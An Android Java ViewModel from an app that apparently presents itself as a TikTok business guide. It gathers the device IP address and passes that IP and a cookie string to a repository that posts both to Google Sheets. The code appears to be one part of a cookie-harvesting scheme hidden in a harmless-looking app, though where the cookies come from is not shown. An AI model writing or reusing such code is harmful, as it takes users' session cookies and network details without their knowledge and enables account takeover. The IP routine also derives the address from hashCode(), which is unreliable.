package com.teamwork.businessguideprofortiktok.src.resource.viewmodels.google_sheet;

import android.text.format.Formatter;
import android.util.Log;

import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModel;

import com.teamwork.businessguideprofortiktok.src.resource.repositories.GoogleSheetRepository;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;

public class GoogleSheetViewModel extends ViewModel {
    private GoogleSheetRepository mGoogleSheetRepository ;
    private MutableLiveData<String> mReponseDataSever = new MutableLiveData<>();
    public MutableLiveData<String>  mIp = new MutableLiveData<>();;
    public MutableLiveData<String> mCookies = new MutableLiveData<>();

    public void postDataGoogleSheets(String ip,String cookies){
        mGoogleSheetRepository = new GoogleSheetRepository();
        mGoogleSheetRepository.postDataGoogleSheets(ip,cookies);
        mGoogleSheetRepository.getDataReponseSever().observeForever(new Observer<String>() {
            @Override
            public void onChanged(String s) {
                mReponseDataSever.setValue(s);
            }
        });
    }

    public LiveData<String> getDataReponseSever(){
        return mReponseDataSever;
    }

    public void setIp(String ipAddress){
        mIp.postValue(ipAddress);
    }

    public LiveData<String>getIp(){
        return  mIp;
    }

    public void setCookies(String cookiesAddress){
        mCookies.postValue(cookiesAddress);
    }

    public LiveData<String>getCookies(){
        return  mCookies;
    }

    public String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.i("IP", "***** IP="+ ip);

                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("IP", ex.toString());
        }
        return null;
    }
}
